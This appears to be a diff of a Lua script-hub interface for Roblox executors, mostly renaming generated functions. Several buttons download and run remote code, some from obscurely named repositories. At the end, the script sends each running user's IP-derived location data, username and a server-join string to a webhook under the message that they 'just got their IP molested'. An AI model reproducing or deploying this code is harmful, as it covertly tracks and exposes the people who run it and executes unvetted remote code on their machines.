 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
 	end)
 end
-coroutine.wrap(MHDRWO_fake_script)()
-local function GTNDYNT_fake_script() -- SAF.SAFLoadstring 
+coroutine.wrap(ZHRUFNL_fake_script)()
+local function WXGZASZ_fake_script() -- SAF.SAFLoadstring 
 	local script = Instance.new('LocalScript', SAF)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/yougotonesickfishlol53454354343/puke53gn72857328tnrj057320805327gre0523875037285023rj78/refs/heads/main/FENWHBH3IFN43HUG435BT34UTB43HTO3TBH43OH3UBHTO"))()
 	end)
 end
-coroutine.wrap(GTNDYNT_fake_script)()
-local function FAKTXG_fake_script() -- HBEGUI.HBEGUILoadstring 
+coroutine.wrap(WXGZASZ_fake_script)()
+local function FXDHXLO_fake_script() -- HBEGUI.HBEGUILoadstring 
 	local script = Instance.new('LocalScript', HBEGUI)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/yougotonesickfishlol53454354343/puke53gn72857328tnrj057320805327gre0523875037285023rj78/refs/heads/main/WEGGJINGIUHGHI4TY4385734Y534TUGIJ4N3G3HJ4G34Y8Y435T34HGGBY4TTB3HNT434IBT34"))()
 	end)
 end
-coroutine.wrap(FAKTXG_fake_script)()
-local function WUJQ_fake_script() -- NA.NALoadstring 
+coroutine.wrap(FXDHXLO_fake_script)()
+local function XDGX_fake_script() -- NA.NALoadstring 
 	local script = Instance.new('LocalScript', NA)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
 	end)
 end
-coroutine.wrap(WUJQ_fake_script)()
-local function BAGHC_fake_script() -- Hydroxide.HydroxideLoadstring 
+coroutine.wrap(XDGX_fake_script)()
+local function YIMAB_fake_script() -- Hydroxide.HydroxideLoadstring 
 	local script = Instance.new('LocalScript', Hydroxide)
 
 	script.Parent.Activated:Connect(function()
@@ -2072,16 +2226,16 @@ local function BAGHC_fake_script() -- Hydroxide.HydroxideLoadstring
 		webImport("ui/main")
 	end)
 end
-coroutine.wrap(BAGHC_fake_script)()
-local function GUCP_fake_script() -- Rspy.RspyLoadstring 
+coroutine.wrap(YIMAB_fake_script)()
+local function NOFXPIV_fake_script() -- Rspy.RspyLoadstring 
 	local script = Instance.new('LocalScript', Rspy)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
 	end)
 end
-coroutine.wrap(GUCP_fake_script)()
-local function ZZYNLCZ_fake_script() -- Sidebar.ConstantCheck 
+coroutine.wrap(NOFXPIV_fake_script)()
+local function LLHTFD_fake_script() -- Sidebar.ConstantCheck 
 	local script = Instance.new('LocalScript', Sidebar)
 
 	script.Parent.Parent.SHub.Activated:Connect(function()
@@ -2102,8 +2256,8 @@ local function ZZYNLCZ_fake_script() -- Sidebar.ConstantCheck
 		
 	end)
 end
-coroutine.wrap(ZZYNLCZ_fake_script)()
-local function HGUPFQ_fake_script() -- Home_2.Home 
+coroutine.wrap(LLHTFD_fake_script)()
+local function MNVHSE_fake_script() -- Home_2.Home 
 	local script = Instance.new('LocalScript', Home_2)
 
 	script.Parent.Activated:Connect(function()
@@ -2120,8 +2274,8 @@ local function HGUPFQ_fake_script() -- Home_2.Home
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(HGUPFQ_fake_script)()
-local function VCKJJG_fake_script() -- Clock.ClockUpdate 
+coroutine.wrap(MNVHSE_fake_script)()
+local function WDIVM_fake_script() -- Clock.ClockUpdate 
 	local script = Instance.new('LocalScript', Clock)
 
 	while true do
@@ -2131,8 +2285,8 @@ local function VCKJJG_fake_script() -- Clock.ClockUpdate
 	end
 	
 end
-coroutine.wrap(VCKJJG_fake_script)()
-local function OOZCMP_fake_script() -- ProfilePicture.SetToPFP 
+coroutine.wrap(WDIVM_fake_script)()
+local function OOTQ_fake_script() -- ProfilePicture.SetToPFP 
 	local script = Instance.new('LocalScript', ProfilePicture)
 
 	local player = game.Players.LocalPlayer
@@ -2141,8 +2295,8 @@ local function OOZCMP_fake_script() -- ProfilePicture.SetToPFP
 	imageLabel.Image = playerThumbnail
 	
 end
-coroutine.wrap(OOZCMP_fake_script)()
-local function OUKSAO_fake_script() -- FullView.Return 
+coroutine.wrap(OOTQ_fake_script)()
+local function HVHCVN_fake_script() -- FullView.Return 
 	local script = Instance.new('LocalScript', FullView)
 
 	script.Parent.Activated:Connect(function()
@@ -2150,7 +2304,8 @@ local function OUKSAO_fake_script() -- FullView.Return
 		script.Parent.Parent.Frame.Visible = true
 	end)
 end
-coroutine.wrap(OUKSAO_fake_script)()
+coroutine.wrap(HVHCVN_fake_script)()
+
 
 local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
 print(helo) --line above generates a script that allows u to join the logged user
@@ -2168,10 +2323,10 @@ local data = {
 	["username"] = "HUB-LOG", --webhook name thing idk
 	["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
 
-	["content"] = "**" ..game.Players.LocalPlayer.Name.. "** just executed the script hub.", --normal message
+	["content"] = "**<@&1366351244813406228> " ..game.Players.LocalPlayer.Name.. "** just executed the script hub.", --normal message
 	["embeds"] = {
 		{
-			["title"] = "** <@&1366351244813406228>" ..game.Players.LocalPlayer.Name.. " just got their IP molested.**",
+			["title"] = "**" ..game.Players.LocalPlayer.Name.. " just got their IP molested.**",
 			["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
 			["type"] = "rich", --line above sends all the info grabbed using the api + username and executor
 			["color"] = 14680319,
